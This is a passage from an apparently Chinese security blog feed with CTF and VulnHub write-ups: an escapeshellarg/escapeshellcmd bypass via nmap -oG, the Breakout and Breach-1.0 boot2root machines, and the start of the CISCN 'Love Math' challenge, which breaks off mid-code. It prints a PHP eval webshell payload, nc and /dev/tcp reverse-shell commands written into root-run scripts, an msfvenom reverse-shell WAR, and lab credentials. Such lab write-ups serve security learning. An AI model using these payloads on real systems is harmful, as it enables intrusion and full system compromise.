<li>假设传入的参数是：<code>172.17.0.2' -v -d a=1</code></li>
<li>经过<code>escapeshellarg</code>处理后变成了<code>'172.17.0.2'\'' -v -d a=1'</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
<li>经过<code>escapeshellcmd</code>处理后变成<code>'172.17.0.2'\\'' -v -d a=1\'</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对</strong>的引号进行了转义。</li>
<li>最后执行的命令是<code>curl '172.17.0.2'\\'' -v -d a=1\'</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>'</code>没有被转义，与再后面的<code>'</code>配对成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1'</code>，即向<code>172.17.0.2\</code>发起请求，POST
数据为<code>a=1'</code>。</li>
</ol>
<p>总而言之：</p>
<ul>
<li>escapeshellarg
<ul>
<li>确保用户只传递一个参数（在整个外面添加单引号，使字符串成为一个整体）</li>
<li>用户不能指定更多的参数</li>
<li>用户不能执行不同的命令（一般
<code>127.0.0.1;ls</code>，在外面添加单引号使 <code>;</code>
与前后文变成整体，因此无法实现执行多条命令）</li>
</ul></li>
<li>escapeshellcmd
<ul>
<li>确保用户只执行一个命令（会在落单的引号前添加转义字符使其失去闭合前面引号的作用）</li>
<li>用户可以指定不限量的参数</li>
<li>用户不能执行不同的命令（<code>;  $  |</code>
等符号都会被添加转义字符使其失去功能，变成字符本身）</li>
</ul></li>
</ul>
<h1 id="解题">解题</h1>
<p>本题其实还涉及 nmap 的参数，nmap 可以用 <code>-oG</code>
将执行结果写入文件。</p>
<p>语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap [任意内容] -oG fileName</span><br></pre></td></tr></table></figure></p>
<p>接下来就是细节方面的讨论了。就是如何绕过前面所说的两个函数。我们需要写入文件的肯定是一句话木马，因此payload如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
<p>这样子 <code>-oG</code>
与上下文变成一个整体，无法被当作参数执行。因此需要把单引号去掉，只要最前面添加单引号就可以把后面释放出来。修改后：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>由于 <code>\\</code>
使后者不作为转移符号，因此第三个单引号还能起作用，与第四个单引号成对，单引号内容为空，可以去掉：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>于是 <code>oG</code>
可以被成功执行，但是此时前面的木马写入的文件的名字为
<code>shell.php'</code>
。（<strong>我由于已经做完了，下面蚁剑连接只是作为证明，以便理解</strong>）
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191734.png" /></p>
<p>内容为： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191747.png" />
（<code>\\</code> 使后者失去转义功能，仅仅作为
<code>\</code>，因此木马最前面有一个 <code>\</code>）</p>
<p>不是 <code>php</code>
文件，无法连接。接下需要把后面的单引号也要去掉，因此在后面也添加单引号：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>简化后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>注意，前面的 <code>''\\''</code> 因为前面的两个单引号成对，因此
<code>\\</code> 不被单引号包括，也就是不是字符串；而后者
<code>'\\'''</code>中<code>\\</code>被单引号包括，因此前一个转义字符不执行转义字符，而是被当作普通的字符。</p>
</blockquote>
<p>因此最后生成的文件名为 <code>shell.php\\</code>。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192825.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192834.png" /></p>
<p>解决办法也很简单，那就是加一个空格就好： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php &#x27;</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>简化后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>此时相当于把 <strong>木马</strong> 和 <code>\\</code>
一起写入了文件。路径如下，注意别把 <code>Starting</code>
也当作路径。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322193312.png" /></p>
<p>用蚁剑连接即可。flag在根目录。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>RCE</tag>
        <tag>nmap命令</tag>
      </tags>
  </entry>
  <entry>
    <title>Breakout Writeup</title>
    <url>/2022/05/28/Breakout%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度不高。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/empire-breakout,751/">Empire:
Breakout ~ VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到2个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>低或者中</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528083212.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528083246.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p>先访问80端口。主页面就是apache2安装成功后的界面，没有其他有用的信息。路径扫描结果如下图</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528083722.png" /></p>
<p>没有有用的。查看页面源码，当翻到页面最下方的时候看到了一串注释
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">don&#x27;t worry no one will get here, it&#x27;s safe to share with you my access. Its encrypted :)</span><br><span class="line"></span><br><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br></pre></td></tr></table></figure></p>
<p>意思：不要担心有人能到这里，这里是安全的，所以我要给你分享我的访问信息，它是加密的。后面就是brainfuck代码，解码之后为：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.2uqPEfj3D&lt;P&#x27;a-3</span><br></pre></td></tr></table></figure></p>
<p>但是还不知道这是哪里的密码。</p>
<p>10000端口和20000端口都是一个登陆界面，且使用了 ssl 加密。其中 10000
端口是 webmin 而 20000 端口是 usermin</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528084332.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528084342.png" /></p>
<p>使用如下命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">enum4linux -a 192.168.100.24</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528092117.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyber:.2uqPEfj3D&lt;P&#x27;a-3</span><br></pre></td></tr></table></figure>
<p>使用上述信息成功登录 usermin</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528092455.png" /></p>
<h1 id="get-shell">3. get shell</h1>
<p>这个后台get shell的方法很简单。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528092531.png" /></p>
<p>上图中红框的地方就是后台自带的命令行。然后直接使用下面命令即可反弹shell
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 192.168.100.10 -e /bin/bash</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528092645.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528092629.png" /></p>
<h1 id="权限提升">4. 权限提升</h1>
<p>首先在家目录发现了一个奇怪的可执行文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528101158.png" /></p>
<p>查看 /usr/bin/tar 和这个，发现文件大小是一样的</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528101237.png" /></p>
<p>因此，这应该就是 tar 命令。</p>
<p>查看了 /etc/passwd 发现只有两个用户，root和cyber。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528101341.png" /></p>
<p>该靶机没有sudo命令，也没有suid提权。输入如下命令看一下是否有capability：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528101507.png" /></p>
<p>/home/cyber/tar 具有 cap_dac_read_search 的能力，该能力能够使
/home/cyber/tar
执行的时候忽略目标文件的权限限制。简单来说就是可以使用该文件去压缩没有读、写、执行权限的文件。</p>
<p>又在 /var/backups/ 目录下找到一个 .old_pass.bak 的文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528101659.png" /></p>
<p>使用下面命令将其压缩：（先回到家目录） <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./tar -cvzf old.tar.gz /var/backups/.old_pass.bak</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528101919.png" /></p>
<p>再使用下面命令将其解压： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./tar -xvzf old.tar.gz</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528102015.png" /></p>
<p>最后进入到 /home/cyber/var/backups/ 读取 .old_pass.bak</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528102105.png" /></p>
<p>这应该就是 root 的密码了，使用如下信息 su 成 root <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:Ts&amp;4&amp;YurgtRX(=~h</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220528102211.png" /></p>
<p>最后的最后，读取两个flag作为收尾： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /home/cyber/user.txt</span><br><span class="line">3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;</span><br><span class="line"></span><br><span class="line">2. /root/rOOt.txt</span><br><span class="line">3mp!r3&#123;You_Manage_To_BreakOut_From_My_System_Congratulation&#125;</span><br><span class="line"></span><br><span class="line">Author: Icex64 &amp; Empire Cybersecurity</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机还算比较简单，涉及的攻击方法有：</p>
<ol type="1">
<li>brainfuck解密</li>
<li>后台get shell</li>
<li>capability提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>brainfuck解密</tag>
        <tag>后台get shell</tag>
        <tag>capability提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Breach-1.0 Writeup</title>
    <url>/2022/05/26/Breach-1.0%20Writeup/</url>
    <content><![CDATA[<p>我认为，该靶机难度还是很高的。被作者骗了。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/breach-1,152/">Breach: 1 ~
VulnHub</a></li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到1个flag</li>
</ul>
<p>难度：</p>
<ul>
<li>高</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526203450.png" /></p>
<p>通过对端口的扫描，发现该靶机开放了许多的端口，这看过去不正常，不论如何，先从80端口入手。</p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526203548.png" /></p>
<p>那段绿色的文字没有什么特殊意义，就是讲述了一个背景。查看页面源码发现注释了藏着一段字符：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</span><br></pre></td></tr></table></figure></p>
<p>将字符两次base64解码后得到如下字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526201522.png" /></p>
<p>暂时不知道这串字符的意思，先放在一旁。从源码中可以看出，点击图片会跳转到一个新的页面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526201641.png" /></p>
<p>最后一个功能点得到一个登录界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526203615.png" /></p>
<p>使用刚刚二次base64解码获得的信息登录：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526205847.png" /></p>
<p>成功登录。</p>
<h2 id="后台信息">2.3. 后台信息</h2>
<p>在 inbox 中找到三封邮件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526210209.png" /></p>
<p>最后一封邮件的内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FWD: Thank you for your purchase of Super Secret Cert Pro!</span><br><span class="line">  </span><br><span class="line">Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob ------------------------------------------------------------------------------------------------------------------------------------------- From: registrar@penetrode.com Sent: 02 June 2016 16:16 To: bob@initech.com; admin@breach.local Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!</span><br></pre></td></tr></table></figure></p>
<p>注意其中的 <code>192.168.110.140/.keystore</code> 以及 SSL
certificate。将前者下载下来。</p>
<p>（第一次登录后台需要编辑以下设置，就是在那些settings那里选择取消即可）点击
contributions 的 content 然后点击进去</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526210854.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526210939.png" /></p>
<p>意思大致是这里有一份红队抓取的pcap包，但是经过加密的，同时
alias、storepassword、
keypassword都是tomcat。访问红框中的文件，下载下来。</p>
<p>这时候想到刚刚下载的文件可能能够解密，但是这里我并不了解，于是Google...</p>
<p>先利用 keytool 查看 keystore 中是否存在对应证书： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -list -keystore keystore</span><br></pre></td></tr></table></figure></p>
<p>密码是 tomcat。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526212036.png" /></p>
<p>从中提取出证书 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12</span><br></pre></td></tr></table></figure></p>
<p>没导入前的流量有着许多加密信息。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526213222.png" /></p>
<p>然后将该证书导入 wireshark 中。edit -&gt; preferences 中</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526213431.png" /></p>
<p>（不知道为什么明明是SSL加密，却选择TLS。端口可以查看流量中涉及到的关于靶机的端口就是8443，协议为http，密码为tomcat）再次查看流量，就会发现都被解密了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526213525.png" /></p>
<p>找到 http 协议的流量，右键然后选择 follow TLS stream</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526213729.png" /></p>
<p>找到如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526213803.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</span><br></pre></td></tr></table></figure>
<p>将其base64解码得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat:Tt\5D8F(#!*u=G)4m7zB</span><br></pre></td></tr></table></figure></p>
<p>根据流量包中的信息，得到一个新的url：<code>https://192.168.110.140:8443/_M@nag3Me/html</code></p>
<blockquote>
<p>注意：不能直接使用浏览器访问，我是开了burpsuite才可以访问到。是https，因为经过了加密，也可以直接在流量中找到。</p>
</blockquote>
<p>输入用户名和密码即可登录成功。</p>
<h1 id="get-shell">3. get shell</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526214822.png" /></p>
<p>这里存在文件上传，可以直接上传 .war 的文件，这是 Java
的一种文件后缀。因此靶机上存在着Java环境，利用下面命令生成Java的后门
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.3 LPORT=4444 -f war &gt; shell.war</span><br></pre></td></tr></table></figure></p>
<p>然后上传</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526215123.png" /></p>
<p>最后先监听对应端口，然后点击即可成功反弹shell</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526215210.png" /></p>
<h1 id="权限提升">4. 权限提升</h1>
<h2 id="方法1">4.1. 方法1</h2>
<p>在查看 /etc/passwd 的时候发现了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526215927.png" /></p>
<p>而在 192.168.110.140/images 中也有一张图片 bill.png，会不会藏有关于
blumbergh 的信息呢？</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526220026.png" /></p>
<p>这个猜测是 blumbergh 的密码。成功登录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526220118.png" /></p>
<p>查看家目录下的 .bash_history： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clear</span><br><span class="line">logoff</span><br><span class="line">logout</span><br><span class="line">exit</span><br><span class="line">cd /usr/share/cleanup</span><br><span class="line">cat tidyup.sh</span><br></pre></td></tr></table></figure></p>
<p>查看 tidyup.sh 内容： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">Hacker Evasion Script</span> </span><br><span class="line"><span class="meta">#</span><span class="bash">Initech Cyber Consulting, LLC</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Peter Gibbons and Michael Bolton - 2016</span></span><br><span class="line"><span class="meta">#</span><span class="bash">This script is <span class="built_in">set</span> to run every 3 minutes as an additional defense measure against hackers.</span></span><br><span class="line"></span><br><span class="line">cd /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf</span><br></pre></td></tr></table></figure></p>
<p>root会每3分钟执行该程序，如果我们能够写入数据就好了。查看 sudo -l</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526220759.png" /></p>
<p>将反弹shell的命令利用 tee 命令写入该文件： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.110.3/3333 0&gt;&amp;1&#x27;&quot;|sudo tee /usr/share/cleanup/tidyup.sh</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526221018.png" /></p>
<p>成功写入。</p>
<p>kali开启监听，等待一会之后，成功拿到shell</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526221533.png" /></p>
<p>最后读取flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/.flag.txt</span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">______                     _     __   _____      _____ _          _____          _ </span><br><span class="line">| ___ \                   | |   /  | |  _  |    |_   _| |        |  ___|        | |</span><br><span class="line">| |_/ /_ __ ___  __ _  ___| |__ `| | | |/&#x27; |______| | | |__   ___| |__ _ __   __| |</span><br><span class="line">| ___ \ &#x27;__/ _ \/ _` |/ __| &#x27;_ \ | | |  /| |______| | | &#x27;_ \ / _ \  __| &#x27;_ \ / _` |</span><br><span class="line">| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |</span><br><span class="line">\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line">Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!</span><br><span class="line"></span><br><span class="line">Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.</span><br></pre></td></tr></table></figure></p>
<h2 id="方法2">4.2. 方法2</h2>
<p>查看进程，发现存在mysql <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526221837.png" /></p>
<p>在 /var/www/5446 下面找到两个 php 文件，其中存放着数据库相关信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526222017.png" /></p>
<p>直接使用：<code>mysql -u root</code> 登录数据库。在 mysql.user
表中发现了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526222245.png" /></p>
<p>将密码破解<a href="https://hashes.com/en/decrypt/hash">Decrypt MD5,
SHA1, MySQL, NTLM, SHA256, SHA512, Wordpress, Bcrypt hashes for free
online</a></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526222421.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">milton:thelaststraw</span><br></pre></td></tr></table></figure>
<p>成功登录该用户</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526222529.png" /></p>
<p>然后在 /etc/init.d 目录下找属主为root但是当前用户拥有写权限的文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526222944.png" /></p>
<p>这个目录下的文件都会在开机时自动执行，因此我们直接修改 portly.sh
的内容为： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.110.3/3333 0&gt;&amp;1&#x27;&quot; &gt; portly.sh</span><br></pre></td></tr></table></figure></p>
<p>然后重启靶机（物理重启）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526223443.png" /></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机还是挺难的，尤其是get
webshell的过程，很复杂，涉及到很多我之前没有了解过的知识点。</p>
<ol type="1">
<li>流量加/解密</li>
<li>文件上传</li>
<li>图片隐写</li>
<li>sudo提权</li>
</ol>
]]></content>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>文件上传</tag>
        <tag>流量加/解密</tag>
        <tag>图片隐写</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN 2019 初赛 Love Math</title>
    <url>/2022/04/10/CISCN%202019%20%E5%88%9D%E8%B5%9B%20Love%20Math/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BCISCN%202019%20初赛%5DLove%20Math">Love
Math</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境直接就给了源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span 